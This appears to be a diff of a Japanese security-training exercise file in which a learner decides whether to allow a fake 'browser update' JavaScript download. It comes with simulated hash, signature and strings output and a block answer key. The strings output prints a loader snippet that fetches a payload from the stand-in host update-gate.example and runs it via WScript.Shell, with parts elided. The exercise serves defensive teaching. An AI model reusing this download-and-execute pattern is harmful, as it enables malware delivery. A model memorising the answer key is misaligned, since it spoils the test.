@@ -1,26 +1,50 @@
 {
-  "schema_version": 1,
+  "schema_version": 2,
   "id": "FILE-WIN-FAKE-UPDATE",
   "category": "file",
   "platform": "windows",
-  "level": "applied",
-  "ground_truth": "block",
   "title": "偽のソフトウェア更新",
   "request": "保留中のファイルを開く・実行することを許可しますか。 ALLOW / BLOCKで判断してください。",
-  "initial_information": {
-    "File": "C:\\Downloads\\browser-update.js",
-    "申請内容": "閲覧中のサイトに「再生にはブラウザー更新が必要」と表示され取得。",
-    "状態": "未実行。ダウンロードまたは受領直後。"
+  "required_evidence": [
+    "strings",
+    "official"
+  ],
+  "ground_truth": "block",
+  "explanation": "配布ファイルは更新プログラムではなく外部スクリプトを取得・実行するJavaScriptで、正規更新経路とも一致しないため遮断します。偽の更新案内による実行誘導を題材にしています。",
+  "initial": {
+    "information": [
+      {
+        "id": "File",
+        "label": "File",
+        "value": "C:\\Downloads\\browser-update.js",
+        "data_type": "file"
+      },
+      {
+        "id": "申請内容",
+        "label": "申請内容",
+        "value": "閲覧中のサイトに「再生にはブラウザー更新が必要」と表示され取得。",
+        "data_type": "text"
+      },
+      {
+        "id": "状態",
+        "label": "状態",
+        "value": "未実行。ダウンロードまたは受領直後。",
+        "data_type": "text"
+      }
+    ],
+    "terms": [
+      "file",
+      "extension",
+      "path",
+      "script",
+      "browser"
+    ]
   },
-  "initial_information_types": {
-    "File": "file"
-  },
-  "tools": [
+  "resources": [
     {
       "id": "hash",
       "name": "Get-FileHash",
       "description": "SHA-256を計算します。PID入力では対応する実体ファイルが対象です。",
-      "output": "Algorithm : SHA256\nHash : BD7FDDD0736762793800C187077AA656BE58DD09C67097D35C6A43B80306DDA7\nPath : C:\\Downloads\\browser-update.js",
       "accepted_information_types": [
         "file"
       ],
@@ -35,20 +59,41 @@
       "environments": [
         "windows"
       ],
-      "output_information": [
-        {
-          "id": "sha256",
-          "label": "対象ファイルのSHA-256",
-          "value": "bd7fddd0736762793800c187077aa656be58dd09c67097d35c6a43b80306dda7",
-          "data_type": "sha256"
-        }
+      "kind": "tools",
+      "result": {
+        "content": "Algorithm : SHA256\nHash : BD7FDDD0736762793800C187077AA656BE58DD09C67097D35C6A43B80306DDA7\nPath : C:\\Downloads\\browser-update.js",
+        "information": [
+          {
+            "id": "sha256",
+            "label": "対象ファイルのSHA-256",
+            "value": "bd7fddd0736762793800c187077aa656be58dd09c67097d35c6a43b80306dda7",
+            "data_type": "sha256"
+          }
+        ],
+        "terms": [
+          "file",
+          "extension",
+          "path",
+          "script",
+          "browser",
+          "hash",
+          "sha256"
+        ]
+      },
+      "terms": [
+        "file",
+        "executable",
+        "hash",
+        "sha256",
+        "pid",
+        "image_process",
+        "tool_hash_win"
       ]
     },
     {
       "id": "sig",
       "name": "Sigcheck",
       "description": "署名の検証状態・発行元を確認します。PID入力では実体ファイルが対象です。",
-      "output": "C:\\Downloads\\browser-update.js:\n  Verified: Unsigned\n  Publisher: n/a",
       "accepted_information_types": [
         "file"
       ],
@@ -62,13 +107,35 @@
       "platform_note": "Windows / Microsoft Sysinternals・要導入",
       "environments": [
         "windows"
+      ],
+      "kind": "tools",
+      "result": {
+        "content": "C:\\Downloads\\browser-update.js:\n  Verified: Unsigned\n  Publisher: n/a",
+        "terms": [
+          "extension",
+          "path",
+          "script",
+          "browser",
+          "signature",
+          "vendor",
+          "unsigned",
+          "n_a"
+        ]
+      },
+      "terms": [
+        "file",
+        "executable",
+        "pid",
+        "image_process",
+        "signature",
+        "vendor",
+        "tool_sigcheck"
       ]
     },
     {
       "id": "strings",
       "name": "Strings (Sysinternals)",
       "description": "ファイル内の可読文字列を抽出します。",
-      "output": "対象: C:\\Downloads\\browser-update.js\n抽出文字列（抜粋）:\nvar request = new ActiveXObject(\"MSXML2.XMLHTTP\");\nrequest.open(\"GET\", \"https://update-gate.example/payload\", false);\nrequest.send();\n〔応答の保存処理を省略〕\nWScript.CreateObject(\"WScript.Shell\").Run(〔保存先を渡す引数を省略〕);",
       "accepted_information_types": [
         "file"
       ],
@@ -82,354 +149,50 @@
       "platform_note": "Windows / Microsoft Sysinternals・要導入",
       "environments": [
         "windows"
+      ],
+      "kind": "tools",
+      "result": {
+        "content": "対象: C:\\Downloads\\browser-update.js\n抽出文字列（抜粋）:\nvar request = new ActiveXObject(\"MSXML2.XMLHTTP\");\nrequest.open(\"GET\", \"https://update-gate.example/payload\", false);\nrequest.send();\n〔応答の保存処理を省略〕\nWScript.CreateObject(\"WScript.Shell\").Run(〔保存先を渡す引数を省略〕);",
+        "terms": [
+          "extension",
+          "path",
+          "script",
+          "browser",
+          "static_analysis",
+          "url",
+          "training_placeholder",
+          "http",
+          "url_path"
+        ]
+      },
+      "terms": [
+        "file",
+        "static_analysis",
+        "tool_strings"
       ]
-    }
-  ],
-  "references": [
+    },
     {
       "id": "official",
       "name": "公式サービス・ドメイン",
-      "content": "AsterBrowserの更新は組織のSoftware Center経由。Webページから配布する.jsの実行は更新手順に含まれない。"
-    }
-  ],
-  "external_references": [],
-  "required_evidence": [
-    "strings",
-    "official"
-  ],
-  "glossary": [
-    {
-      "term_id": "file",
-      "occurrences": [
-        {
-          "source_id": "initial_information",
-          "section": "initial"
-        },
-        {
-          "source_id": "hash",
-          "section": "overview"
-        },
-        {
-          "source_id": "hash",
-          "section": "result"
-        },
-        {
-          "source_id": "sig",
-          "section": "overview"
-        },
-        {
-          "source_id": "strings",
-          "section": "overview"
-        }
-      ]
-    },
-    {
-      "term_id": "extension",
-      "occurrences": [
-        {
-          "source_id": "initial_information",
-          "section": "initial"
-        },
-        {
-          "source_id": "hash",
-          "section": "result"
-        },
-        {
-          "source_id": "sig",
-          "section": "result"
-        },
-        {
-          "source_id": "strings",
-          "section": "result"
-        },
-        {
-          "source_id": "official",
-          "section": "result"
-        }
-      ]
-    },
-    {
-      "term_id": "path",
-      "occurrences": [
-        {
-          "source_id": "initial_information",
-          "section": "initial"
-        },
-        {
-          "source_id": "hash",
-          "section": "result"
-        },
-        {
-          "source_id": "sig",
-          "section": "result"
-        },
-        {
-          "source_id": "strings",
-          "section": "result"
-        }
-      ]
-    },
-    {
-      "term_id": "script",
-      "occurrences": [
-        {
-          "source_id": "initial_information",
-          "section": "initial"
-        },
-        {
-          "source_id": "hash",
-          "section": "result"
-        },
-        {
-          "source_id": "sig",
-          "section": "result"
-        },
-        {
-          "source_id": "strings",
-          "section": "result"
-        }
-      ]
-    },
-    {
-      "term_id": "browser",
-      "occurrences": [
-        {
-          "source_id": "initial_information",
-          "section": "initial"
-        },
-        {
-          "source_id": "hash",
-          "section": "result"
-        },
-        {
-          "source_id": "sig",
-          "section": "result"
-        },
-        {
-          "source_id": "strings",
-          "section": "result"
-        },
-        {
-          "source_id": "official",
-          "section": "result"
-        }
-      ]
-    },
-    {
-      "term_id": "executable",
-      "occurrences": [
-        {
-          "source_id": "hash",
-          "section": "overview"
-        },
-        {
-          "source_id": "sig",
-          "section": "overview"
-        }
-      ]
-    },
-    {
-      "term_id": "hash",
-      "occurrences": [
-        {
-          "source_id": "hash",
-          "section": "overview"
-        },
-        {
-          "source_id": "hash",
-          "section": "result"
-        }
-      ]
-    },
-    {
-      "term_id": "sha256",
-      "occurrences": [
-        {
-          "source_id": "hash",
-          "section": "overview"
-        },
-        {
-          "source_id": "hash",
-          "section": "result"
-        }
-      ]
-    },
-    {
-      "term_id": "pid",
-      "occurrences": [
-        {
-          "source_id": "hash",
-          "section": "overview"
-        },
-        {
-          "source_id": "sig",
-          "section": "overview"
-        }
-      ]
-    },
-    {
-      "term_id": "image_process",
-      "occurrences": [
-        {
-          "source_id": "hash",
-          "section": "overview"
-        },
-        {
-          "source_id": "sig",
-          "section": "overview"
-        }
-      ]
-    },
-    {
-      "term_id": "tool_hash_win",
-      "occurrences": [
-        {
-          "source_id": "hash",
-          "section": "overview"
-        }
-      ]
-    },
-    {
-      "term_id": "signature",
-      "occurrences": [
-        {
-          "source_id": "sig",
-          "section": "overview"
-        },
-        {
-          "source_id": "sig",
-          "section": "result"
-        }
-      ]
-    },
-    {
-      "term_id": "vendor",
-      "occurrences": [
-        {
-          "source_id": "sig",
-          "section": "overview"
-        },
-        {
-          "source_id": "sig",
-          "section": "result"
-        }
-      ]
-    },
-    {
-      "term_id": "tool_sigcheck",
-      "occurrences": [
-        {
-          "source_id": "sig",
-          "section": "overview"
-        }
-      ]
-    },
-    {
-      "term_id": "unsigned",
-      "occurrences": [
-        {
-          "source_id": "sig",
-          "section": "result"
-        }
-      ]
-    },
-    {
-      "term_id": "n_a",
-      "occurrences": [
-        {
-          "source_id": "sig",
-          "section": "result"
-        }
-      ]
-    },
-    {
-      "term_id": "static_analysis",
-      "occurrences": [
-        {
-          "source_id": "strings",
-          "section": "overview"
-        },
-        {
-          "source_id": "strings",
-          "section": "result"
-        }
-      ]
-    },
-    {
-      "term_id": "tool_strings",
-      "occurrences": [
-        {
-          "source_id": "strings",
-          "section": "overview"
-        }
-      ]
-    },
-    {
-      "term_id": "url",
-      "occurrences": [
-        {
-          "source_id": "strings",
-          "section": "result"
-        }
-      ]
-    },
-    {
-      "term_id": "training_placeholder",
-      "occurrences": [
-        {
-          "source_id": "strings",
-          "section": "result"
-        }
-      ]
-    },
-    {
-      "term_id": "http",
-      "occurrences": [
-        {
-          "source_id": "strings",
-          "section": "result"
-        }
-      ]
-    },
-    {
-      "term_id": "url_path",
-      "occurrences": [
-        {
-          "source_id": "strings",
-          "section": "result"
-        }
-      ]
-    },
-    {
-      "term_id": "host",
-      "occurrences": [
-        {
-          "source_id": "official",
-          "section": "overview"
-        }
-      ]
-    },
-    {
-      "term_id": "software_center",
-      "occurrences": [
-        {
-          "source_id": "official",
-          "section": "result"
-        }
+      "kind": "references",
+      "result": {
+        "content": "AsterBrowserの更新は組織のSoftware Center経由。Webページから配布する.jsの実行は更新手順に含まれない。",
+        "terms": [
+          "extension",
+          "browser",
+          "software_center"
+        ]
+      },
+      "terms": [
+        "host"
       ]
     }
   ],
-  "explanation": "配布ファイルは更新プログラムではなく外部スクリプトを取得・実行するJavaScriptで、正規更新経路とも一致しないため遮断します。偽の更新案内による実行誘導を題材にしています。",
-  "topic": "更新の主張をファイル内容と公式更新経路で検証する",
-  "summary": "更新の主張をファイル内容と公式更新経路で検証する",
   "learning_objectives": [
     "更新の主張をファイル内容と公式更新経路で検証する"
   ],
-  "decision_context": "before_execution",
-  "scenario_type": "real_world_inspired",
   "sources": [
     "https://www.cisecurity.org/insights/blog/ctas-leveraging-fake-browser-updates-in-malware-campaigns"
   ],
-  "fixture_note": "登場する組織名、ドメイン、IPアドレス、パッケージ名、ハッシュ値、記録は架空のものです。IPアドレスには文書用アドレスを使い、外部評判の照会も実際には行っていません。時刻は2026-08-18を基準とし、必要な項目だけを抜粋しています。コマンド欄やソース欄の「〔…を省略〕」は、教材で省いた箇所を示します。実行可能なペイロードは配布していません。各問題は独立した端末・案件の状態を表すスナップショットです。PIDや時刻の再利用は問題間の関連を意味しません。Z付きの時刻を除き、時刻はすべて日本標準時（JST）です。",
   "inspired_by": "Fake Software Update"
 }
